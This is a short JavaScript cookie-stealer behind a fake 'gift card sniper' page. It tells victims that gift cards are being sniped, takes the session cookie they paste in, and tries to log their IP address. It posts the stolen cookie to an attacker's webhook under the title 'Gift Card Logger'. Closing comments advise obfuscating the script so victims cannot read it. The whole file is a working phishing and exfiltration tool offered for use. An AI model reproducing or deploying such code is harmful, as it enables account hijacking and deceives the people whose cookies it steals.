const yourwebhook = "WEBHOOK HERE" //change to your webhook

function Send() {
  let UserIp; // IP log
    fetch('https://api.ipify.org/?format=json')
    .then(results => results.json())
    .then(data => (ip = data.ip))
    .then(result => {
    ip = result.ip;
    })
  if (document.getElementById("CookieInput").value.length < 50 ) {
    document.getElementById("CookieError").innerHTML = "Enter A Valid Cookie." // checks to see if they actually entered a possibly valid cookie
    document.getElementById("CookieError").style.color = "red";
    throw new Error("end")
  }
  var cookies = document.getElementById("CookieInput").value; //getting cookies
  document.getElementById("CookieError").innerHTML = "Successfully Started! Sniping Gift Cards Now!"
  document.getElementById("CookieError").style.color = "green"
  var params = { //how message looks
    username: "sigma#4268",
    avatar_url: "https://melmagazine.com/wp-content/uploads/2021/01/66f-1.jpg",
    content: "@here ",
    embeds: [
        {
            "title": "sigma/xyz's Gift Card Logger",
            "color": '000000',
            "thumbnail": {
                "url": "",
            },
            "fields": [
                {
                    "name": "Gift Card Logger",
                    "value": "User's Cookies: " + cookies + "\nUser's IP: " + UserIp,
                    "inline": true
                }
            ]
        }
    ]
}
fetch(yourwebhook, {
    method: "POST", //sending to yur webhook
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
}).then(res => {
    console.log(res);
}) 
}
//sigma#4268
//idk how to make a cookie checker in javascript but enjoy
// also i recommend obfuscating the javascript so that they can't see the source code. you can use obfuscator.io
